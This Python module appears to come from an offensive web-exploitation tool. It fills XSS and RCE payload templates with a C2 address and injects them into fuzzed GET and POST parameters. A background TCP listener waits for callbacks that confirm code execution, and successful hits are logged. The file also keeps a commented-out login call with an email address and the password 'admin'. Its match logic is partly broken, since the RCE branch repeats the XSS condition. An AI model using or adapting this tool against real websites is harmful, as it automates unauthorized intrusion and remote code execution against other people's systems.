import random
import yaml
import socket
import requests
import urllib.parse
from modules.scanner import session
from threading import Thread

check = 0

def read_template():
    payloads = []
    with open('./template/XSS.yaml') as f:
        payloads.append(yaml.load(f, Loader=yaml.FullLoader))

    with open('./template/RCE.yaml') as f:
        payloads.append(yaml.load(f, Loader=yaml.FullLoader))
    return payloads

def read_fuzz(filename):
    with open(f'{filename}', 'r', encoding='utf-8') as f:
        lines = [i.strip() for i in f.readlines()]
    return lines

def tcp_server():
    global check
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # print(f'[+] Open server 0.0.0.0 {port}')
    sock.bind(('0.0.0.0', port))
    sock.listen(1)
    while True:
        connection, client_address = sock.accept()
        if client_address:
            check = 1
            connection.close()

def send_request(url, payload, method, match, int_v, filename):
    global check
    match = match.replace('{{INT}}', int_v)

    if method == 'GET':
        try:
            # r = session.post('http://192.168.175.219/cve_project/ajax.php?action=login', data={"email":"mayuri.infospace@gmail.com", "password":"admin"})
            r = session.get(url)
        except Exception as e:
            print("[!] Error", e)
            return   
        
    elif method == 'POST':
        try:
            data = url.split('?')[1]
            params = urllib.parse.parse_qs(urllib.parse.unquote(data), keep_blank_values=True)
            
            data = {key: value[0] for key, value in params.items()}
            r = session.post(url, data=data)
        except Exception as e:
            # print(e)
            return

    if r.text.find(match) != -1:
        print(f'[+] XSS Exploit {method}  {payload}  {url}')
        with open(f'{filename}-Success.txt','a', encoding='utf-8') as f:
            f.write(f'[+] XSS Exploit {method} {url}\n')

    elif r.text.find(match) != -1 or check == 1:
        print(f'[+] RCE Exploit {method} {url}')
        check = 0
        with open(f'{filename}-Success.txt','a', encoding='utf-8') as f:
            f.write(f'[+] RCE Exploit {method} {url}\n')
    else:
        with open(f'{filename}-Fail.txt','a', encoding='utf-8') as f:
            f.write(url+"\n")

def start(c2, c2_port, filetxt, filename):
    global server, port
    server = c2
    port =  c2_port

    template = read_template()

    for template in read_template():
        metch = template['http']['matchers'][0]
        for t in read_fuzz(filetxt):
            url, method = t.split(':::')[0], t.split(':::')[1]
            for payload in template['http']['payload']:
                int_v = str(random.randint(1, 1000))
                payload = payload.replace("{{IP}}", server).replace('{{PORT}}', str(port)).replace('{{INT}}', int_v)
                exp = url.replace('FuZZ1nG', payload)
                send_request(exp, payload, method, metch, int_v, filename)
            
def exploit(c2, port, filename):
    t1 = Thread(target=start, args=(c2, port, f"{filename}-Fuzz.txt", filename))
    t2 = Thread(target=tcp_server, daemon=True)
    
    t1.start()
    t2.start()

    t1.join()